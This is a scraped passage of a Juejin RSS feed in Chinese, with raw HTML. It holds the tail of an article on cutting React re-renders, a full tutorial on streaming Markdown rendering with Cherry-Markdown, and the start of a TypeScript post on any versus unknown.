pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>“我的页面就改了个弹窗开关，为什么整个列表都闪了一下？”<br/>
—— 如果你也曾这样怀疑人生，这篇内容就是为你写的。</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">一、为什么“重新渲染”这么贵？</h2>
<p>React 的默认行为是：<strong>父组件一更新，所有子组件无条件跟着渲染</strong>。<br/>
在小型 Demo 里这没什么，但在真实业务里：</p>
<ul>
<li>列表 1000 项，每项 20 个 DOM，一次渲染就是 2 万次比对；</li>
<li>图表、表格、富文本编辑器初始化一次要几百毫秒；</li>
<li>低端手机掉帧、风扇狂转、用户开始骂娘。</li>
</ul>
<p><strong>性能优化第一性原理</strong>：<br/>
<strong>“不要阻止 React 更新，而是让它根本没必要更新。”</strong></p>
<hr/>
<h2 data-id="heading-1">二、10 个实战招式，招招致命</h2>







































































<table><thead><tr><th>招式</th><th>一句话记忆</th><th>典型场景</th><th>代码片段</th></tr></thead><tbody><tr><td>① React.memo</td><td>“子组件 props 没变就别来烦我”</td><td>纯展示组件</td><td><code>export default React.memo(Card)</code></td></tr><tr><td>② useCallback</td><td>“函数引用给我稳住”</td><td>传给子组件的回调</td><td><code>const onClick = useCallback(() =&gt; {}, [id])</code></td></tr><tr><td>③ useMemo</td><td>“对象/数组也给我稳住”</td><td>过滤、排序、映射</td><td><code>const list = useMemo(() =&gt; filter(raw), [raw, key])</code></td></tr><tr><td>④ 状态下放</td><td>“状态别放爷爷组件”</td><td>弹窗、开关、表单</td><td>把 <code>isOpen</code> 放到 <code>&lt;Modal&gt;</code> 父级，而非 App 根</td></tr><tr><td>⑤ 拆分小组件</td><td>“大组件=大锅饭”</td><td>列表项、卡片</td><td>1000 行上帝组件拆成 20 行 Item 组件</td></tr><tr><td>⑥ 容器/展示</td><td>“数据层与视图层离婚”</td><td>任何页面</td><td>容器取数 → 展示 memo</td></tr><tr><td>⑦ Context 拆值</td><td>“Context value 别每次新对象”</td><td>主题、用户</td><td>用 <code>useMemo</code> 包 value，或拆成两个 Context</td></tr><tr><td>⑧ 禁用 render 新建组件</td><td>“别在函数里写函数组件”</td><td>动态渲染</td><td>组件定义放顶层</td></tr><tr><td>⑨ 状态管理库</td><td>“props drilling 超过 3 层就上库”</td><td>跨页面共享</td><td>Zustand / Redux / Jotai</td></tr><tr><td>⑩ Profiler 复盘</td><td>“先量化，再优化”</td><td>任何优化前后</td><td>React DevTools → Profiler → 录制 → 对比</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-2">三、案例复盘：一个“搜索列表”从 450 ms 到 45 ms</h2>
<h3 data-id="heading-3">1. 背景</h3>
<ul>
<li>商品列表 500 条，支持关键字搜索、分类筛选；</li>
<li>每次输入字符，整个页面闪一下，搜索框掉帧；</li>
<li>测试手机：Redmi Note 9。</li>
</ul>
<h3 data-id="heading-4">2. 问题定位（Profiler）</h3>
<ol>
<li>输入字符 → 根组件 setState → 整页重新渲染；</li>
<li>列表项组件未 memo，每条都执行 render；</li>
<li>过滤函数在 render 内执行，O(n) 复杂度 × 500；</li>
<li>回调函数每次新建，导致 memo 失效。</li>
</ol>
<h3 data-id="heading-5">3. 四步优化</h3>
<p><strong>Step 1 状态下放</strong><br/>
把搜索关键字 <code>keyword</code> 从 App 根级放到 <code>&lt;SearchList&gt;</code> 组件，其他模块不再受牵连。</p>
<p><strong>Step 2 缓存计算</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> filtered = <span class="hljs-title function_">useMemo</span>(
  <span class="hljs-function">() =&gt;</span> goods.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">g</span> =&gt;</span> g.<span class="hljs-property">name</span>.<span class="hljs-title function_">includes</span>(keyword)),
  [goods, keyword]
);
</code></pre>
<p><strong>Step 3 缓存回调</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> onAddCart = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">(<span class="hljs-params">id</span>) =&gt;</span> cart.<span class="hljs-title function_">add</span>(id), [cart]);
</code></pre>
<p><strong>Step 4 列表项 memo</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Item</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">{ goods, onAddCart }</span>) =&gt;</span> (
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{goods.name}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> onAddCart(goods.id)}&gt;加购<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
));
</code></pre>
<h3 data-id="heading-6">4. 结果</h3>
<ul>
<li>输入字符时，仅 SearchList 与列表重新渲染，Header、Sidebar、Footer 纹丝不动；</li>
<li>单次渲染耗时从 450 ms → 45 ms；</li>
<li>掉帧率从 18% → 0%。</li>
</ul>
<hr/>
<h2 data-id="heading-7">四、最容易踩的 5 个“反模式”</h2>
<ol>
<li>
<p><strong>在 render 里写箭头函数</strong><br/>
<code>&lt;button onClick={() =&gt; handleClick(id)} /&gt;</code><br/>
→ 每次新引用，子组件 memo 失效。</p>
</li>
<li>
<p><strong>在 render 里新建对象</strong><br/>
<code>&lt;Child style={{ color: 'red' }} /&gt;</code><br/>
→ 同上，用 <code>useMemo</code> 或提前声明常量。</p>
</li>
<li>
<p><strong>把函数组件写在另一个组件内部</strong><br/>
见上文“新建组件类型”。</p>
</li>
<li>
<p><strong>滥用 key 来“刷新”组件</strong><br/>
只有身份变更才改 key，局部数据更新请用状态。</p>
</li>
<li>
<p><strong>Context value 直接传对象字面量</strong></p>
<pre><code class="hljs language-js" lang="js">&lt;<span class="hljs-title class_">AuthCtx</span> value={{ user, setUser }}&gt;  
</code></pre>
<p>→ 每次渲染都生成新对象，所有消费者重渲染。<br/>
解决：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> value = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> ({ user, setUser }), [user]);
</code></pre>
</li>
</ol>
<hr/>
<h2 data-id="heading-8">五、checklist：上线前必查的 8 个问题</h2>
<ol>
<li>所有纯展示组件都包 <code>React.memo</code> 了吗？</li>
<li>传给 memo 组件的函数都用 <code>useCallback</code> 缓存了吗？</li>
<li>对象/数组 props 都用 <code>useMemo</code> 缓存了吗？</li>
<li>状态是否放在“最近公共祖先”？</li>
<li>列表 key 用的是稳定 ID 而不是索引？</li>
<li>过滤/排序放在 render 里了吗？挪进 <code>useMemo</code>！</li>
<li>有 props drilling 超过 3 层吗？考虑 Context 或状态库。</li>
<li>用 Profiler 录制一次主流程，确认没出现“黄色长条”。</li>
</ol>
<hr/>
<h2 data-id="heading-9">六、写在最后</h2>
<p>优化重新渲染，就像给 React 应用做“断舍离”：<br/>
<strong>少一点不必要的更新，多一点丝滑的体验。</strong><br/>
把这 10 个招式练成肌肉记忆，你也能在 Code Review 时自信地留下那句：</p>
<blockquote>
<p>“这段我 memo 过了，放心合并。”</p>
</blockquote>
<p>祝你的下一次 <code>npm start</code> 不再闪屏，愿所有列表都如丝般顺滑。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何快速实现markdown流式渲染]]></title>    <link>https://juejin.cn/post/7581329603778215972</link>    <guid>https://juejin.cn/post/7581329603778215972</guid>    <pubDate>2025-12-09T03:05:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581329603778215972" data-draft-id="7581324707480551465" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何快速实现markdown流式渲染"/> <meta itemprop="keywords" content="Markdown"/> <meta itemprop="datePublished" content="2025-12-09T03:05:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="泰达米尔"/> <meta itemprop="url" content="https://juejin.cn/user/942708679258650"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何快速实现markdown流式渲染
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/942708679258650/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    泰达米尔
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:05:58.000Z" title="Tue Dec 09 2025 03:05:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1、引言</h2>
<p>在AI聊天场景中，Markdown内容的流式渲染变得越来越重要。传统的Markdown渲染器在处理流式内容时往往会遇到语法不完整导致的渲染异常问题。<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTencent%2Fcherry-markdown" target="_blank" title="https://github.com/Tencent/cherry-markdown" ref="nofollow noopener noreferrer">Cherry-Markdown</a>作为一款功能强大的Markdown编辑器，专门针对流式渲染场景进行了深度优化，提供了稳定、高效的流式渲染能力。</p>
<h2 data-id="heading-1">2、流式渲染遇到的问题</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45b5b4d7fa504ef0a0bff842d92f9bd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rOw6L6-57Gz5bCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854357&amp;x-signature=m2MygPqjW0LOns1uFpXdAyDzTus%3D" alt="录屏_20251209_103349.gif" loading="lazy"/>
上图是一个传统的Markdown流式渲染输出的效果，可见在传统的Markdown流式渲染中，开发者会遇到以下问题：</p>
<h3 data-id="heading-2">2.1、语法不完整导致的渲染异常</h3>
<p>当Markdown内容以字符为单位逐步输出时，语法结构往往是不完整的：</p>
<ul>
<li><strong>加粗/斜体语法</strong>：<code>**加粗内容</code> 缺少闭合符号</li>
<li><strong>行内/段落代码块</strong>：<code> ```javascript</code> 缺少闭合的 <code>```</code>导致会先显示markdown源码再渲染成代码高亮</li>
<li><strong>表格</strong>：表格分隔行不完整</li>
<li><strong>公式</strong>：数学公式符号不匹配</li>
<li><strong>标题</strong>: 会先显示<code>##</code>符号再渲染成标题</li>
<li><strong>超链接</strong>：会先显示<code>[xxx](xxxx</code>，最后再变成超链接</li>
<li><strong>图片、音视频</strong>：会先显示前面的源码，最后再变成图片或音视频</li>
<li><strong>无序列表</strong>：每次换行输出<code>-</code>时都会命中标题语法，先渲染成标题再渲染成无序列表</li>
<li><strong>mermaid画图</strong>：渲染过程中由于结构不完整，会经常出现报错</li>
<li><strong>脚注</strong>：当脚注语法没有输出完全时，角标无法正常渲染</li>
</ul>
<h3 data-id="heading-3">2.2、渲染性能问题</h3>
<ul>
<li>频繁的DOM更新导致页面卡顿</li>
<li>大量重绘和重排影响用户体验</li>
<li>渲染间隔过长导致“视频”变“幻灯片”</li>
</ul>
<h3 data-id="heading-4">2.3、用户体验不佳</h3>
<ul>
<li>不完整的语法结构暴露给用户</li>
<li>缺乏类似打字机的视觉反馈</li>
</ul>
<h2 data-id="heading-5">3、使用Cherry-Markdown进行流式渲染的效果</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3914454d174488fa80cd370234c376b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rOw6L6-57Gz5bCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854357&amp;x-signature=mdtsulY6R0RiS4iZqj2vgbwXy9A%3D" alt="录屏_20251209_104328.gif" loading="lazy"/>
上图是使用Cherry-Markdown进行流式渲染的效果，当然也可以在<a href="https://link.juejin.cn?target=https%3A%2F%2Ftencent.github.io%2Fcherry-markdown%2Fexamples%2Fai_chat.html" target="_blank" title="https://tencent.github.io/cherry-markdown/examples/ai_chat.html" ref="nofollow noopener noreferrer">官方在线demo</a> 直接进行体验，Cherry-Markdown通过以下特性解决了上述问题：</p>
<h3 data-id="heading-6">3.1 语法自动补全</h3>
<p>开启流式渲染模式后，Cherry会自动补全以下语法元素：</p>
<ul>
<li>标题</li>
<li>加粗、斜体</li>
<li>超链接</li>
<li>图片、音视频</li>
<li>行内代码块</li>
<li>段落代码块</li>
<li>行内公式</li>
<li>段落公式</li>
<li>无序列表</li>
<li>表格</li>
<li>mermaid画图</li>
<li>脚注</li>
</ul>
<h3 data-id="heading-7">3.2 性能优化</h3>
<ul>
<li><strong>渲染频率提升</strong>：渲染频率可达到10ms/次</li>
<li><strong>增量渲染</strong>：只更新变化的部分内容，尽可能的减少dom重绘区域，如下图：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d0c65d967694b5fab4323484abe3d5c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rOw6L6-57Gz5bCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765854357&amp;x-signature=JIzfCdzwQki%2BScD6ZBIRyHEKVEk%3D" alt="录屏_20251209_104800.gif" loading="lazy"/></li>
<li><strong>异步渲染处理</strong>：支持图表等异步内容的渲染</li>
</ul>
<h3 data-id="heading-8">3.3 用户体验增强</h3>
<ul>
<li><strong>虚拟光标</strong>：提供类似打字机的视觉反馈</li>
<li><strong>稳定输出</strong>：避免语法不完整导致的渲染异常</li>
</ul>
<h2 data-id="heading-9">4、如何使用</h2>
<h3 data-id="heading-10">4.1 基础配置</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> cherry = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cherry</span>({
  <span class="hljs-attr">editor</span>: {
    <span class="hljs-attr">height</span>: <span class="hljs-string">'auto'</span>,
    <span class="hljs-attr">defaultModel</span>: <span class="hljs-string">'previewOnly'</span>, <span class="hljs-comment">// 纯预览模式适合流式场景</span>
  },
  <span class="hljs-attr">engine</span>: {
    <span class="hljs-attr">global</span>: {
      <span class="hljs-attr">flowSessionContext</span>: <span class="hljs-literal">true</span>,     <span class="hljs-comment">// 开启流式渲染</span>
      <span class="hljs-attr">flowSessionCursor</span>: <span class="hljs-string">'default'</span>, <span class="hljs-comment">// 添加虚拟光标</span>
    },
  },
  <span class="hljs-attr">previewer</span>: {
    <span class="hljs-attr">enablePreviewerBubble</span>: <span class="hljs-literal">false</span>,   <span class="hljs-comment">// 关闭预览区编辑功能</span>
  },
});
</code></pre>
<h3 data-id="heading-11">4.2 流式内容更新</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟流式输出</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">streamContent</span>(<span class="hljs-params">content, cherryInstance</span>) {
  <span class="hljs-keyword">let</span> currentIndex = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">const</span> interval = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (currentIndex &lt; content.<span class="hljs-property">length</span>) {
      <span class="hljs-keyword">const</span> currentText = content.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, currentIndex + <span class="hljs-number">1</span>);
      cherryInstance.<span class="hljs-title function_">setMarkdown</span>(currentText);
      currentIndex++;
      
      <span class="hljs-comment">// 自动滚动到最新位置</span>
      <span class="hljs-keyword">const</span> previewer = cherryInstance.<span class="hljs-property">previewer</span>.<span class="hljs-title function_">getDom</span>();
      previewer.<span class="hljs-property">scrollTop</span> = previewer.<span class="hljs-property">scrollHeight</span>;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-built_in">clearInterval</span>(interval);
      <span class="hljs-comment">// 流式输出完成后清除虚拟光标</span>
      cherryInstance.<span class="hljs-title function_">clearFlowSessionCursor</span>();
    }
  }, <span class="hljs-number">30</span>); <span class="hljs-comment">// 30ms的更新间隔</span>
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">const</span> content = <span class="hljs-string">`# 欢迎使用Cherry-Markdown流式渲染

这是一个**加粗文字**的示例。

\`\`\`javascript
console.log("Hello, World!");
\`\`\`

| 项目 | 价格 | 数量 |
|------|------|------|
| 计算机 | ¥1600 | 5 |
`</span>;

<span class="hljs-title function_">streamContent</span>(content, cherry);
</code></pre>
<h3 data-id="heading-12">4.3 高级配置选项</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 完整的高级配置</span>
<span class="hljs-keyword">const</span> advancedConfig = {
  <span class="hljs-attr">engine</span>: {
    <span class="hljs-attr">global</span>: {
      <span class="hljs-attr">flowSessionContext</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">flowSessionCursor</span>: <span class="hljs-string">'&lt;span class="custom-cursor"&gt;|&lt;/span&gt;'</span>, <span class="hljs-comment">// 自定义光标</span>
    },
    <span class="hljs-attr">syntax</span>: {
      <span class="hljs-attr">image</span>: {
        <span class="hljs-attr">selfClosing</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-comment">// 图片加载时的占位符</span>
        <span class="hljs-attr">selfClosingRender</span>: <span class="hljs-function">(<span class="hljs-params">type, alt, src</span>) =&gt;</span> {
          <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;img src="loading.gif" alt="<span class="hljs-subst">${alt}</span>" data-src="<span class="hljs-subst">${src}</span>"&gt;`</span>;
        }
      },
    }
  },
  <span class="hljs-comment">// 事件监听</span>
  <span class="hljs-attr">callback</span>: {
    <span class="hljs-attr">afterAsyncRender</span>: <span class="hljs-function">(<span class="hljs-params">markdown, html</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'异步渲染完成:'</span>, html);
    }
  }
};
</code></pre>
<h2 data-id="heading-13">5、总结</h2>
<p>Cherry-Markdown的流式渲染功能为现代Web应用提供了强大的Markdown内容展示能力。通过语法自动补全、性能优化和用户体验增强，它完美解决了传统流式渲染中的各种问题。</p>
<h3 data-id="heading-14">主要优势：</h3>
<ol>
<li><strong>稳定性</strong>：自动补全语法，避免渲染异常</li>
<li><strong>高性能</strong>：10ms级的渲染频率，增量更新dom，支持大量内容流式展示</li>
<li><strong>易用性</strong>：默认支持丰富的markdown语法和流式渲染机制，通过简单的配置即可实现复杂的流式渲染需求</li>
<li><strong>扩展性</strong>：支持扩展<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTencent%2Fcherry-markdown%2Fwiki%2F%25E8%2587%25AA%25E5%25AE%259A%25E4%25B9%2589%25E8%25AF%25AD%25E6%25B3%2595" target="_blank" title="https://github.com/Tencent/cherry-markdown/wiki/%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AF%AD%E6%B3%95" ref="nofollow noopener noreferrer">自定义语法</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTencent%2Fcherry-markdown%2Fwiki%2F%25E5%25A4%2584%25E7%2590%2586URL" target="_blank" title="https://github.com/Tencent/cherry-markdown/wiki/%E5%A4%84%E7%90%86URL" ref="nofollow noopener noreferrer">url处理</a>和<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTencent%2Fcherry-markdown%2Fwiki%2F%25E4%25BA%258B%25E4%25BB%25B6%26%25E5%259B%259E%25E8%25B0%2583" target="_blank" title="https://github.com/Tencent/cherry-markdown/wiki/%E4%BA%8B%E4%BB%B6&amp;%E5%9B%9E%E8%B0%83" ref="nofollow noopener noreferrer">事件处理</a></li>
</ol>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTencent%2Fcherry-markdown" target="_blank" title="https://github.com/Tencent/cherry-markdown" ref="nofollow noopener noreferrer">Cherry-Markdown</a>的流式渲染功能让开发者能够专注于业务逻辑，而无需担心Markdown渲染的细节问题，是构建现代Web应用的理想选择。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【TS】any的问题及与unknown的区别]]></title>    <link>https://juejin.cn/post/7581457966966063114</link>    <guid>https://juejin.cn/post/7581457966966063114</guid>    <pubDate>2025-12-09T03:18:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581457966966063114" data-draft-id="7581619505583996979" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【TS】any的问题及与unknown的区别"/> <meta itemprop="keywords" content="TypeScript,前端"/> <meta itemprop="datePublished" content="2025-12-09T03:18:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="浩浩酱"/> <meta itemprop="url" content="https://juejin.cn/user/1292681405276024"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【TS】any的问题及与unknown的区别
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1292681405276024/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    浩浩酱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:18:00.000Z" title="Tue Dec 09 2025 03:18:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
